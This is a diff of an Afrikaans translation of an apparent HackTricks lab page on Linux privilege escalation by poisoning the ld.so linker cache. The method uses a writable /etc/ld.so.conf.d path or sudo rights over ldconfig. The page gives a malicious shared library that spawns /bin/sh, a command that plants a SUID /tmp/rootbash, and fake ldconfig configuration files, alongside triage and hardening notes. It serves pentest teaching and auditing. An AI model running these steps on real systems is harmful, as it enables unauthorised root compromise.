@@ -1,12 +1,10 @@
-# ld.so privesc exploit voorbeeld
+# ld.so privesc exploit-voorbeeld
 
-{{#include ../../banners/hacktricks-training.md}}
-
-Hierdie bladsy is ’n gefokusde lab vir die poisoning van die **system linker cache deur middel van `/etc/ld.so.conf` of `ldconfig`**. Vir missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` en ander generiese SUID linker abuse, sien [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).
+Hierdie bladsy is ’n gefokusde lab vir die poisoning van die **system linker cache deur `/etc/ld.so.conf` of `ldconfig`**. Vir missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD` en ander generiese SUID linker abuse, sien [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).
 
 ## Berei die omgewing voor
 
-In die volgende afdeling kan jy die kode vind van die lêers wat ons gaan gebruik om die omgewing voor te berei.
+In die volgende afdeling kan jy die kode vind van die lêers wat ons gaan gebruik om die omgewing voor te berei
 
 {{#tabs}}
 {{#tab name="sharedvuln.c"}}
@@ -44,7 +42,7 @@ puts("Hi");
 
 1. **Skep** daardie lêers op jou masjien in dieselfde vouer
 2. **Kompileer** die **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Kopieer** `libcustom.so` na `/usr/lib` en verfris die cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
+3. **Kopieer** `libcustom.so` na `/usr/lib` en verfris die kas: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
 4. **Kompileer** die **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
 ### Kontroleer die omgewing
@@ -63,7 +61,7 @@ Hi
 ```
 ### Nuttige triage-opdragte
 
-Wanneer jy ’n werklike teiken aanval, verifieer die **presiese biblioteeknaam** wat die binêre lêer benodig, wat die loader **tans oplos**, en watter gekonfigureerde paaie skryfbaar is sonder om die aktiewe cache te wysig.<sup>[[1]](#references)[[2]](#references)</sup>
+Wanneer ’n werklike teiken aangeval word, verifieer die **presiese library-naam** wat die binary benodig, wat die loader **tans resolve**, en watter gekonfigureerde paaie skryfbaar is sonder om die live cache te wysig.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>
 ```bash
 # Needed SONAME and program interpreter
 readelf -d ./sharedvuln | grep NEEDED
@@ -82,39 +80,42 @@ namei -l /home/ubuntu/lib
 # Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
 /sbin/ldconfig -N -X -v 2>/dev/null
 ```
-Gebruik `ldd` slegs op ’n **vertroude** uitvoerbare lêer. Sommige implementasies of ongewone ELF-interpreteerders kan veroorsaak dat dit aanvallerbeheerde kode uitvoer; `objdump -p ./file | grep NEEDED` lys direkte afhanklikhede veilig. Vir ’n vertroude teiken wys die aanroeping van die ontdekte interpreter met `--list` die werklike resolusie.<sup>[[4]](#references)</sup>
+Gebruik `ldd` slegs op ’n **vertroude** executable. Sommige implementasies of ongewone ELF-interpreters kan veroorsaak dat dit attacker-controlled code uitvoer; `objdump -p ./file | grep NEEDED` lys direct dependencies veilig. Vir ’n vertroude target wys die aanroep van die ontdekte interpreter met `--list` die werklike resolution.<sup>[[4]](#references)</sup>
 
-’n Paar nuttige slaggate:
+’n Paar nuttige gotchas:
 
-- `sudo echo ... > /etc/ld.so.conf.d/x.conf` **werk gewoonlik nie** omdat die herleiding deur jou huidige shell gedoen word. Gebruik eerder
+- `sudo echo ... > /etc/ld.so.conf.d/x.conf` **werk gewoonlik nie** omdat die redirection deur jou huidige shell gedoen word. Gebruik eerder
 `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
-- **SUID/bevoorregte** binaries ignoreer `LD_LIBRARY_PATH`/`LD_PRELOAD` in
-**secure-execution mode**, maar gidse afkomstig van `/etc/ld.so.conf` is
-steeds deel van die vertroude loader-konfigurasie, dus kan hierdie verkeerde konfigurasie steeds bevoorregte programme beïnvloed.<sup>[[1]](#references)</sup>
-- `LD_DEBUG` word ook in secure-execution mode geïgnoreer tensy `/etc/suid-debug` bestaan, dus versamel die spoor daarvan uit ’n ekwivalente nie-SUID-run eerder as om uitvoer van die bevoorregte uitvoering te verwag.<sup>[[1]](#references)</sup>
-- In nuwer glibc-weergawes stel die dynamic loader ook
-`--list-diagnostics` bloot, wat nuttig is om kasresolusie en
-`glibc-hwcaps`-subgidskeuse te ontfout wanneer ’n hijack nie soos verwag werk nie.<sup>[[1]](#references)</sup>
+- **SUID/privileged** binaries loop in **secure-execution mode**: `LD_LIBRARY_PATH`
+word geïgnoreer, terwyl `LD_PRELOAD` beperk word (name wat ’n slash bevat, word
+geïgnoreer, en slegs setuid-gemerkte libraries in standaarddirectories mag vooraf gelaai word). Sodra root `ldconfig` uitvoer, kan directories wat in
+`/etc/ld.so.conf` gelys word, in `/etc/ld.so.cache` beland; hierdie misconfiguration kan dus steeds privileged programs beïnvloed.<sup>[[1]](#references)[[2]](#references)</sup>
+- `LD_DEBUG` word ook in secure-execution mode geïgnoreer tensy `/etc/suid-debug` bestaan; versamel dus die trace daarvan vanaf ’n ekwivalente non-SUID run eerder as om output van die privileged execution te verwag.<sup>[[1]](#references)</sup>
+- Op glibc 2.33 en nuwer stel die dynamic loader ook
+`--list-diagnostics` bloot, wat machine-readable loader diagnostics en
+ingeboude search-path-inligting druk wanneer ’n hijack nie optree soos verwag nie.<sup>[[1]](#references)[[6]](#references)</sup>
 
-### Kas- en SONAME-beperkings
+### Cache- en SONAME-beperkings
 
-`ldconfig` kas nie elke arbitrêre lêer in ’n gekonfigureerde gids nie: dit ondersoek ELF-kopskrifte, herken name wat met `lib*.so*` of `ld-*.so*` ooreenstem, en verwag die konvensionele `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`-ketting. Die ingevoegde objek moet dus die teikenargitektuur/-klas, die presiese `DT_NEEDED`-naam (gewoonlik sy `DT_SONAME`), en enige simbole/weergawes hê wat die slagoffer oplos.<sup>[[2]](#references)</sup>
+`ldconfig` cache nie elke arbitrêre file in ’n gekonfigureerde directory nie: dit ondersoek ELF headers, herken name wat met `lib*.so*` of `ld-*.so*` ooreenstem, en verwag die konvensionele `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12`-chain. Die injected object moet dus die target se architecture/class, die presiese `DT_NEEDED`-naam (gewoonlik sy `DT_SONAME`), en enige symbols/versions hê wat die victim resolve.<sup>[[2]](#references)</sup>
 ```bash
 readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
 readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
 readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
 ldconfig -p | grep -F 'libcustom.so'
 ```
-Verkies ’n teikenspesifieke library soos in hierdie voorbeeld. Shadowing van ’n algemene SONAME met ’n onvolledige object kan elke proses breek wat dit resolve voordat die beoogde bevoorregte teiken loop.<sup>[[3]](#references)</sup>
+Verkies ’n teikenspesifieke library soos hierdie voorbeeld. Die oorskaduwing van ’n algemene SONAME met ’n onvolledige objek kan elke proses breek wat dit resolve voordat die beoogde geprivilegieerde teiken loop.<sup>[[3]](#references)</sup>
 
 ## Exploit
 
-In hierdie scenario gaan ons aanvaar dat **iemand ’n kwesbare inskrywing geskep het** binne ’n lêer in _/etc/ld.so.conf/_:
+In hierdie scenario, veronderstel ’n administrateur het ’n kwesbare inskrywing bygevoeg tot ’n
+lêer onder `/etc/ld.so.conf.d/` wat deur die stelsel se
+`/etc/ld.so.conf` ingesluit word.<sup>[[1]](#references)[[2]](#references)</sup>
 ```bash
 echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
 ```
 Die kwesbare vouer is _/home/ubuntu/lib_ (waar ons skryftoegang het).\
-**Laai af en compileer** die volgende kode binne daardie pad:
+**Laai af en kompileer** die volgende kode binne daardie pad:
 ```c
 // gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c
 
@@ -130,15 +131,15 @@ puts("I'm the bad library");
 system("/bin/sh");
 }
 ```
-As jy verwag dat **root** (of ’n ander bevoorregte rekening) die kwesbare binary later sal uitvoer, is dit gewoonlik beter om ’n **root-besitte artefak** agter te laat eerder as om ’n interaktiewe shell te begin. Byvoorbeeld:
+As jy verwag dat **root** (of ’n ander bevoorregte rekening) die kwesbare binary later sal uitvoer, is dit gewoonlik beter om ’n **artefak wat deur root besit word** te laat in plaas daarvan om ’n interaktiewe shell te begin. Byvoorbeeld:
 ```c
 system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
 ```
 Dan, nadat die bevoorregte uitvoering plaasgevind het, kan jy `/tmp/rootbash -p` gebruik.
 
-Noudat ons die **kwaadwillige libcustom-biblioteek binne die verkeerd gekonfigureerde** pad **geskep** het, moet die verstekkas deur ’n suksesvolle bevoorregte **`ldconfig`**-uitvoering herbou word. ’n Herlaai help slegs waar die plaaslike selflaaiproses dit werklik aanroep; andersins moet jy wag vir ’n administrateur se handeling of ’n onveilige sudo-reël gebruik indien een beskikbaar is.<sup>[[2]](#references)</sup>
+Noudat ons die kwaadwillige libcustom-biblioteek binne die verkeerd gekonfigureerde pad **geskep** het, moet die verstekkas deur ’n suksesvolle bevoorregte **`ldconfig`**-uitvoering herbou word. ’n Herlaai help slegs waar die plaaslike selflaaiproses dit werklik aanroep; andersins moet jy wag vir ’n administrateuraksie of ’n onveilige sudo-reël gebruik indien een beskikbaar is.<sup>[[2]](#references)</sup>
 
-Nadat dit gebeur het, **kontroleer weer** waar die `sharedvuln`-uitvoerbare lêer die `libcustom.so`-biblioteek vandaan laai:
+Sodra dit gebeur het, **kontroleer weer** waar die `sharedvuln`-uitvoerbare lêer die `libcustom.so`-biblioteek vandaan laai:
 ```c
 $ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffeee766000)
@@ -146,7 +147,7 @@ libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
 /lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
 ```
-Soos jy kan sien, **laai dit dit vanaf `/home/ubuntu/lib`** en indien enige gebruiker dit uitvoer, sal ’n shell uitgevoer word:
+Soos jy kan sien, laai dit vanaf **`/home/ubuntu/lib`**, en as enige gebruiker dit uitvoer, sal ’n shell uitgevoer word:
 ```c
 $ ./sharedvuln
 Welcome to my amazing application!
@@ -155,11 +156,11 @@ $ whoami
 ubuntu
 ```
 > [!TIP]
-> Let daarop dat ons in hierdie voorbeeld nie voorregte verhoog het nie, maar deur die uitgevoerde opdragte te wysig en **te wag dat root of ’n ander bevoorregte gebruiker die kwesbare binêre lêer uitvoer**, sal ons voorregte kan verhoog.
+> Let daarop dat ons in hierdie voorbeeld nie voorregte geëskaleer het nie, maar deur die opdragte wat uitgevoer word te wysig en **te wag vir root of ’n ander bevoorregte gebruiker om die kwesbare binêre lêer uit te voer**, sal ons voorregte kan eskaleer.
 
 ### Moderne `glibc-hwcaps` shadowing
 
-Sedert glibc 2.33 kan die loader geoptimaliseerde libraries onder `glibc-hwcaps/<level>/` binne **elke library-soekgids** voorkeur gee. Gevolglik is dit onvoldoende om slegs `/home/ubuntu/lib` na te gaan: ’n skryfbare versoenbare subgids soos `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` kan die basis-library oorskadu nadat `ldconfig` dit geïndekseer het, terwyl ander CPUs voortgaan om die basisobjek te gebruik. Dit verskaf ook ’n argitektuurselektiewe hijack wat gemis kan word wanneer validering op ’n ander CPU plaasvind.<sup>[[1]](#references)[[3]](#references)</sup>
+Sedert glibc 2.33 kan die loader geoptimaliseerde libraries onder `glibc-hwcaps/<level>/` binne **elke library-soekgids** verkies. Gevolglik is dit onvoldoende om slegs `/home/ubuntu/lib` na te gaan: ’n skryfbare, versoenbare subgids soos `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` kan die basis-library shadow nadat `ldconfig` dit indekseer, terwyl ander CPUs steeds die basis-objek gebruik. Dit verskaf ook ’n argitektuur-selektiewe hijack wat gemis kan word wanneer validering op ’n ander CPU plaasvind.<sup>[[1]](#references)[[3]](#references)</sup>
 ```bash
 # The loader prints the supported levels in priority order
 "$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
@@ -173,26 +174,26 @@ sudo ldconfig
 ldconfig -p | grep -F libcustom.so
 "$interp" --list ./sharedvuln | grep -F libcustom.so
 ```
-Die huidige glibc-hardeningriglyne beveel aan dat duplikaat-SONAMEs, nie-verstek-soekliggings en objects in `glibc-hwcaps`-subgidse vermy word. Vanuit ’n ouditperspektief, pas eienaarskap- en skryfbaarheidkontroles rekursief toe op gekonfigureerde gidse en hul ouerpadkomponente.<sup>[[3]](#references)</sup>
+Die huidige glibc-hardening-riglyne beveel aan dat duplikaat-SONAMEs, nie-standaard soekliggings en objekte in `glibc-hwcaps`-subgidse vermy word. Vanuit ’n ouditperspektief moet eienaarskap- en skryfbaarheidskontroles rekursief op gekonfigureerde gidse en hul ouerpadkomponente toegepas word.<sup>[[3]](#references)</sup>
 
-### Ander wanconfigurasies - Dieselfde vuln
+### Ander miskonfigurasies - Dieselfde vuln
 
-In die vorige voorbeeld het ons ’n wanconfigurasie nagemaak waar ’n administrateur **’n nie-bevoorregte vouer binne ’n konfigurasielêer in `/etc/ld.so.conf.d/` gestel het**.\
-Maar daar is ander wanconfigurasies wat dieselfde kwesbaarheid kan veroorsaak. As jy **skryftoestemmings** het in enige **config file** binne `/etc/ld.so.conf.d`, in die vouer `/etc/ld.so.conf.d` of in die lêer `/etc/ld.so.conf`, kan jy dieselfde kwesbaarheid konfigureer en dit uitbuit.
+In die vorige voorbeeld het ons ’n miskonfigurasie nagemaak waar ’n administrateur **’n nie-bevoorregte gids binne ’n konfigurasielêer in `/etc/ld.so.conf.d/` gestel het**.\
+Maar daar is ander miskonfigurasies wat dieselfde vulnerability kan veroorsaak: as jy **skryftoestemmings** in ’n gelaaide **config file** het, ’n lêer in ’n skryfbare `/etc/ld.so.conf.d/`-gids kan skep, of na `/etc/ld.so.conf` kan skryf, kan jy dieselfde vulnerability konfigureer en exploit.<sup>[[1]](#references)[[2]](#references)</sup>
 
 ## Exploit 2
 
-**Gestel jy het sudo-voorregte oor `ldconfig`**.\
-Jy kan vir `ldconfig` aandui **waarvandaan om die conf files te laai**, sodat ons dit kan benut om `ldconfig` arbitrêre vouers te laat laai.<sup>[[2]](#references)</sup>\
-Kom ons skep dus die lêers en vouers wat nodig is om "/tmp" te laai:
+**Gestel jy het sudo-privileges oor `ldconfig`**.\
+Jy kan met `-f` vir `ldconfig` aandui **watter konfigurasielêer gelees moet word**, dus kan ’n lêer wat attacker-controlled gidse benoem, veroorsaak dat `ldconfig` daardie gidse by die cache voeg.<sup>[[2]](#references)</sup>\
+Kom ons skep dus die lêers en gidse wat nodig is om "/tmp" te laai:
 ```bash
 cd /tmp
 mkdir -p conf
 echo "include /tmp/conf/*" > fake.ld.so.conf
 echo "/tmp" > conf/evil.conf
 ```
-Nou, soos aangedui in die **vorige exploit**, **skep die malicious library binne `/tmp`**.\
-En laastens, laai die path en kontroleer waarvandaan die binary die library laai:
+Soos aangedui in die **vorige exploit**, **skep die kwaadwillige library binne `/tmp`**.\
+En laastens, kom ons laai die pad en kyk waarvandaan die binêre die library laai:
 ```bash
 # -f changes the input configuration; the default output is still /etc/ld.so.cache
 sudo ldconfig -f fake.ld.so.conf
@@ -203,7 +204,7 @@ libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
 libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
 /lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
 ```
-**Soos jy kan sien, kan jy dieselfde vulnerability uitbuit as jy sudo privileges oor `ldconfig` het.** Die opsiebesonderhede is belangrik wanneer ’n beperkte sudo-reël geassesseer word: `-f` kies ’n ander konfigurasie, maar bou steeds `/etc/ld.so.cache` opnuut; `-C` herlei die cache elders; `-N` voorkom die herbou van die cache; en `-X` voorkom skakelbywerkings, maar **bou steeds die cache opnuut tensy dit saam met `-N` gebruik word**.<sup>[[2]](#references)</sup>
+**Soos jy kan sien, kan jy dieselfde kwesbaarheid uitbuit as jy sudo-regte oor `ldconfig` het.** Die besonderhede van die opsies is belangrik wanneer ’n beperkte sudo-reël geassesseer word: `-f` kies ’n ander konfigurasie, maar bou steeds `/etc/ld.so.cache` opnuut; `-C` herlei die cache na ’n ander plek; `-N` voorkom dat die cache herbou word; en `-X` voorkom skakelopdaterings, maar **bou steeds die cache opnuut tensy dit saam met `-N` gebruik word**.<sup>[[2]](#references)</sup>
 
 
 
@@ -213,4 +214,6 @@ libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
 - [2] [ldconfig(8) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
 - [3] [Verharding van die dinamiese skakelaar - Die GNU C-biblioteek](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
 - [4] [ldd(1) - Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/ldd.1.html)
+- [5] [readelf (GNU-binêre nutsprogramme)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
+- [6] [Diagnostiek van die dinamiese skakelaar (Die GNU C-biblioteek)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
 {{#include ../../banners/hacktricks-training.md}}
